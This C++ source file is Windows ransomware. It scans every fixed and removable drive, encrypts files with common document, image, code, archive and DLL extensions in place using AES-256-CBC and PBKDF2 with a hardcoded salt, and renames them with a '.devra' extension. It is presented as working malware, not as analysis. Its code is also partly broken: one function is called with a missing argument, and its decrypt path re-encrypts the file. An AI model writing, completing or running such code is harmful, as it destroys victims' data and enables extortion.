#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include "enc.h"
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <fstream>
#include <filesystem>

namespace fs = std::filesystem;
using namespace std;

std::vector<std::string> targetExtensions = {
    ".txt", ".vsxproj", ".vsxproj.user", ".vsxproj.filters", ".blend", ".tar", ".pro", ".ui", ".pfx",
    ".asp", ".inf", ".iso", ".h", ".url", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".jpg", ".png", ".bmp", ".gif", ".avi", ".mp4", ".mov", ".mp3", ".zip", ".rar",
    ".7z", ".cpp", ".c", ".py", ".java", ".sql", ".mdb", ".cs", ".html", ".csv",
    ".json", ".lnk", ".cmd", ".sln", ".log", ".data", ".xml", ".xaml", ".css", ".js", ".pyw", ".bat", ".dll",
    ".sdb", ".xsd", ".cat", ".msix", ".loc"
};

bool TGTEx(const std::string& filename) {
    fs::path filePath(filename);
    if (filePath.extension() == ".devra") {
        return false;
    }
    for (const auto& ext : targetExtensions) {
        if (filePath.extension() == ext) {
            return true;
        }
    }
    return false;
}

void scanDirectory(const std::string& folderPath, int& fileCount) {
    for (const auto& entry : fs::recursive_directory_iterator(folderPath, fs::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            std::string filename = entry.path().string();
            if (TGTEx(filename)) {
                if (encFil(filename, true)) {
                    addEncryptedExtension(filename);
                    fileCount++;
                }
            }
        }
    }
}

void FiDirScn(int& driveCount, int& totalFileCount) {
    DWORD drives = GetLogicalDrives();
    for (char letter = 'A'; letter <= 'Z'; ++letter) {
        if (drives & (1 << (letter - 'A'))) {
            std::string drive = std::string(1, letter) + ":\\";
            UINT type = GetDriveTypeA(drive.c_str());
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
                driveCount++;
                int fileCount = 0;
                scanDirectory(drive, fileCount);
                totalFileCount += fileCount;
            }
        }
    }
}

void addEncryptedExtension(const std::string &filename) {
    fs::path filePath(filename);
    if (filePath.extension() != ".devra") {
        fs::rename(filePath, filePath.string() + ".devra");
    }
}

bool encFil(const std::string& filename, bool encrypt, const std::string& password) {
    if (!TGTEx(filename)) return false;

    std::ifstream inFile(filename, std::ios::binary);
    if (!inFile) return false;

    std::vector<unsigned char> input((std::istreambuf_iterator<char>(inFile)), {});
    inFile.close();

    // IV PBKDF2
    unsigned char key[32]; // 256 b
    unsigned char iv[16];  // AES 16

    // salt
    const unsigned char salt[8] = {0x43,0x76,0x38,0x57,0x62,0x1F,0xAE,0x45};

    if (!PKCS5_PBKDF2_HMAC_SHA1(password.c_str(), password.length(), salt, sizeof(salt), 10000, sizeof(key), key)) {
        std::cerr << "Key derivation failed\n";
        return false;
    }

    // IV
    if (encrypt) {
        if (!RAND_bytes(iv, sizeof(iv))) {
            std::cerr << "IV generation failed\n";
            return false;
        }
    } else {
        // Decode IV
        if (input.size() < sizeof(iv)) return false;
        std::copy(input.begin(), input.begin() + sizeof(iv), iv);
        input.erase(input.begin(), input.begin() + sizeof(iv));
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    int outlen1 = 0, outlen2 = 0;
    std::vector<unsigned char> output(input.size() + EVP_MAX_BLOCK_LENGTH);

    if (encrypt) {
        if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv)) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        if (1 != EVP_EncryptUpdate(ctx, output.data(), &outlen1, input.data(), input.size())) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        if (1 != EVP_EncryptFinal_ex(ctx, output.data() + outlen1, &outlen2)) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        EVP_CIPHER_CTX_free(ctx);

        // IV + encD
        std::ofstream outFile(filename, std::ios::binary | std::ios::trunc);
        if (!outFile) return false;
        outFile.write(reinterpret_cast<char*>(iv), sizeof(iv));
        outFile.write(reinterpret_cast<char*>(output.data()), outlen1 + outlen2);
        outFile.close();
    } else {
        if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, key, iv)) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        if (1 != EVP_DecryptUpdate(ctx, output.data(), &outlen1, input.data(), input.size())) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        if (1 != EVP_DecryptFinal_ex(ctx, output.data() + outlen1, &outlen2)) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        EVP_CIPHER_CTX_free(ctx);

        std::ofstream outFile(filename, std::ios::binary | std::ios::trunc);
        if (!outFile) return false;
        outFile.write(reinterpret_cast<char*>(output.data()), outlen1 + outlen2);
        outFile.close();

        encFil(filename, true); 
        addEncryptedExtension(filename); 
    }

    return true;
}

int main() {
    int driveCount = 0;
    int totalFileCount = 0;
    FiDirScn(driveCount, totalFileCount);  
    return 0;
}